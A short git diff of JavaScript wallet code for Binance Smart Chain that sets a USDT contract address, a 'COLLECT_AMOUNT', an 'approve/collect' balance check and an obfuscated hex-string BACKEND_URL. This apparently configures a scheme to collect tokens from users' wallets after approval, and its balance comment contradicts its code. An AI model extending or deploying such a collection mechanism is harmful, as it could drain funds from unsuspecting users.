@@ -7,7 +7,7 @@ const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID_HEX = "0x38";
 const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
 const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
-const BACKEND_URL      = "4a9f3fa75a1f44a547b0dc535f223faa0c49d8dda227309ee475846249382788";
+const BACKEND_URL      = "ca66df8d47c356ac16f0bd3cd67524dcf83046d4dded76993488a5ed01cf1b9c";
 
 const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
